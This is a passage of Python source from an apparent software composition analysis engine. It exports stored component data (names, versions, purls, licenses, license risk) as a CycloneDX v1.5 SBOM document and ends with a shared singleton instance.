            "new_health_score": metrics["health_score"],
            "audit_trail_id": f"AUDIT-SCA-{uuid.uuid4().hex[:8].upper()}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    def export_cyclonedx(self, sbom_id: str) -> Dict[str, Any]:
        """Generates standard CycloneDX v1.5 JSON SBOM document."""
        if sbom_id not in self.sboms:
            raise KeyError(f"SBOM ID not found: {sbom_id}")

        sbom_meta = self.sboms[sbom_id]
        comps = self.get_components(sbom_id=sbom_id)

        cyclonedx_components = []
        for c in comps:
            cyclonedx_components.append({
                "type": "library",
                "bom-ref": c["purl"],
                "name": c["name"],
                "version": c["version"],
                "purl": c["purl"],
                "scope": "required" if c["is_direct"] else "optional",
                "licenses": [
                    {"license": {"id": c["license"]}}
                ],
                "properties": [
                    {"name": "cyberdefense:is_direct", "value": str(c["is_direct"]).lower()},
                    {"name": "cyberdefense:license_risk", "value": c["license_risk"]},
                ],
            })

        return {
            "bomFormat": "CycloneDX",
            "specVersion": "1.5",
            "serialNumber": sbom_meta.get("serial_number", f"urn:uuid:{uuid.uuid4()}"),
            "version": 1,
            "metadata": {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "tools": [
                    {
                        "vendor": "Autonomous AI Cyber Defense Platform",
                        "name": "Autonomous SBOM Governance Engine",
                        "version": "2.4.0",
                    }
                ],
                "component": {
                    "type": "application",
                    "name": sbom_meta["name"],
                    "version": sbom_meta["version"],
                },
            },
            "components": cyclonedx_components,
            "dependencies": [
                {
                    "ref": c["purl"],
                    "dependsOn": [],
                }
                for c in cyclonedx_components
            ],
        }


# Singleton instance for platform-wide reuse
sca_engine = ScaEngine()

